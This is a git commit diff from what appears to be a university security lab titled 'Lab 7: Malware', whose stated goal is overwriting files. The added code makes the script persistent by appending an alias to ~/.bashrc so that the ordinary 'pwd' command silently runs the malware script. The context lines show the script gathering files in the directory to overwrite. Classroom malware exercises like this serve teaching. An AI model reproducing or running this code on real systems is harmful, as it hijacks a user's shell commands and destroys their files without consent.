712af848ba27382d8737a88ee9f7ffe7e94e6e26
Annelise Trout <trouta@mail.gvsu.edu>
2020-10-22 21:03:41 -0400

    check first for alias; set if unset, then follow cmd

--- script.sh
+++ script.sh
@@ -3,8 +3,16 @@
 # Lab 7: Malware
 # Goal: overwrite files
 
-# Grab every file except malware script
-#ls | grep -Ev "script.sh"
+# View ~/.bashrc to see current aliases. If we haven't already created an alias 
+# to execute our malware script, then add this alias to further propagate.
+# aliasToMatch = alias to set if nonexistent
+# currentLastAlias = last alias/line currently in ~/.bashrc
+aliasToMatch="alias pwd='/home/cybersecurity/Desktop/cis458labs/lab07/CIS458-Lab7/script.sh'"
+currentLastAlias=$(cat ~/.bashrc | tail -n 1)
+if [ "$currentLastAlias" != "$aliasToMatch" ]; then
+	echo "alias pwd='/home/cybersecurity/Desktop/cis458labs/lab07/CIS458-Lab7/script.sh'" >> ~/.bashrc
+	source ~/.bashrc
+fi
 
 # Load files into an array
 filearray=($(ls | grep -Ev "script[[:digit:]]*.sh"))
